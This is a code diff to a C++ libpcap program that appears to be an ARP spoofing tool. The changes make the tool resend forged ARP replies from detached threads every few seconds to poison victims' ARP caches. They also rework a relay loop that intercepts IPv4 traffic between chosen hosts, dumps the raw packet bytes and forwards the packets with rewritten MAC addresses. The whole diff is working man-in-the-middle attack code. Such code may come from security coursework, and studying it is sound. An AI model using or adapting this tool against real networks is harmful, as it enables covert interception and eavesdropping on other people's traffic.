@@ -142,6 +142,8 @@ void send_arp_reply(pcap_t* handle, Mac my_mac, Ip target_ip, Mac sender_mac, Ip
     packet.arp_.tmac_ = sender_mac;
     packet.arp_.tip_ = htonl(sender_ip);
 
+    // printf("Sending ARP to %s\n", std::string(target_ip).c_str());
+
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 
     if (res != 0) {
@@ -149,11 +151,25 @@ void send_arp_reply(pcap_t* handle, Mac my_mac, Ip target_ip, Mac sender_mac, Ip
     }
 }
 
-void send_arp_reply_loop(pcap_t* handle, Mac my_mac, Ip target_ip, Mac sender_mac, Ip sender_ip) {
-    while (true) {
-        send_arp_reply(handle, my_mac, target_ip, sender_mac, sender_ip);
-        std::this_thread::sleep_for(std::chrono::seconds(10));
+void send_arp_reply_loop(const char* dev, Mac my_mac, Ip target_ip, Mac sender_mac, Ip sender_ip) {
+    printf("Thread for %s start!\n", std::string(target_ip).c_str());
+    
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    if (handle == nullptr) {
+        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
     }
+
+    time_t start_time = time(nullptr);
+    while (true) {
+        if (difftime(time(nullptr), start_time) > 5) {
+            send_arp_reply(handle, my_mac, target_ip, sender_mac, sender_ip);
+            start_time = time(nullptr);
+        }
+    }
+
+    pcap_close(handle);
+
 }
 
 void print_packet_data(const u_char* data, int size) {
@@ -246,6 +262,8 @@ int main(int argc, char* argv[]) {
         }
     }
 
+    printf("Send ARP\n");
+
     for (auto& pair : sender_target_pairs) {
         Ip sender_ip = pair.first;
         Ip target_ip = pair.second;
@@ -254,9 +272,14 @@ int main(int argc, char* argv[]) {
             fprintf(stderr, "Skipping ARP reply to %s due to unknown MAC address.\n", std::string(sender_ip).c_str());
             continue;
         }
-        // send_arp_reply(handle, my_mac, target_ip, sender_mac, sender_ip);
-        std::thread arp_thread(send_arp_reply_loop, handle, my_mac, target_ip, sender_mac, sender_ip);
+        send_arp_reply(handle, my_mac, target_ip, sender_mac, sender_ip);
+        printf("here\n");
+        std::thread arp_thread(send_arp_reply_loop, dev, my_mac, target_ip, sender_mac, sender_ip);
+        arp_thread.detach(); 
     }
+    printf("ARP Finished\n");
+
+    printf("=====Start Relay======\n");
 
     while (true) {
         struct pcap_pkthdr* header;
@@ -268,32 +291,67 @@ int main(int argc, char* argv[]) {
 
         EthHdr* eth_hdr = (EthHdr*)packet_data;
 
-         if (eth_hdr->type() == EthHdr::Ip4) {
+        // Check if the packet is an IPv4 packet
+        if (eth_hdr->type() == EthHdr::Ip4) {
             IpHdr* ip_hdr = (IpHdr*)(packet_data + sizeof(EthHdr));
 
             Ip sender_ip = ip_hdr->sip();
             Ip target_ip = ip_hdr->dip();
-            Mac sender_mac = eth_hdr->smac_;
 
-            auto it = sender_ip_mac_map.find(sender_ip);
-            if (it != sender_ip_mac_map.end()) {
-                // Print the packet content
-                printf("Received packet from %s (MAC: %s) to %s\n",
-                    std::string(sender_ip).c_str(), std::string(sender_mac).c_str(),
-                    std::string(target_ip).c_str());
-                print_packet_data(packet_data, header->caplen);
+            // printf("Sender IP: %s, Target IP: %s\n", std::string(sender_ip).c_str(), std::string(target_ip).c_str());
 
-                // Modify packet: Change source MAC to my MAC address
-                eth_hdr->smac_ = my_mac;
+            // Check if we know the MAC address of the sender
+            auto sender_it = sender_ip_mac_map.find(sender_ip);
+            if (sender_it == sender_ip_mac_map.end()) {
+                continue;  // Unknown sender, skip this packet
+            }
 
-                // Relay the packet to the target
-                int send_res = pcap_sendpacket(handle, packet_data, header->caplen);
-                if (send_res != 0) {
-                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", send_res, pcap_geterr(handle));
+            // Find the corresponding target MAC address
+            auto target_it = sender_ip_mac_map.find(target_ip);
+            if (target_it == sender_ip_mac_map.end()) {
+                continue;  // Unknown target, skip this packet
+            }
+
+            Mac sender_mac = sender_it->second;
+            Mac target_mac = target_it->second;
+
+            // Check if the packet's destination IP matches our target list
+            bool is_target_valid = false;
+            for (const auto& pair : sender_target_pairs) {
+                if (pair.first == sender_ip && pair.second == target_ip) {
+                    is_target_valid = true;
+                    break;
                 }
+            }
+
+            if (!is_target_valid) {
+                continue;  // Skip this packet as it's not meant for the intended target
+            }
+
+            // Print the packet content
+            printf("Relaying packet from %s (MAC: %s) to %s\n",
+                std::string(sender_ip).c_str(), std::string(sender_mac).c_str(),
+                std::string(target_ip).c_str());
+
+            // Print raw packet data
+            for (uint32_t i = 0; i < header->caplen; ++i) {
+                printf("%02x ", packet_data[i]);
+                if ((i + 1) % 16 == 0) printf("\n");
+            }
+            printf("\n");
+
+            // Modify the packet: Change source MAC to my MAC and destination MAC to target MAC
+            eth_hdr->smac_ = my_mac;
+            eth_hdr->dmac_ = target_mac;
+
+            // Relay the packet to the target
+            int send_res = pcap_sendpacket(handle, packet_data, header->caplen);
+            if (send_res != 0) {
+                fprintf(stderr, "pcap_sendpacket returned %d error=%s\n", send_res, pcap_geterr(handle));
             }
         }
     }
+
 
 
     pcap_close(handle);
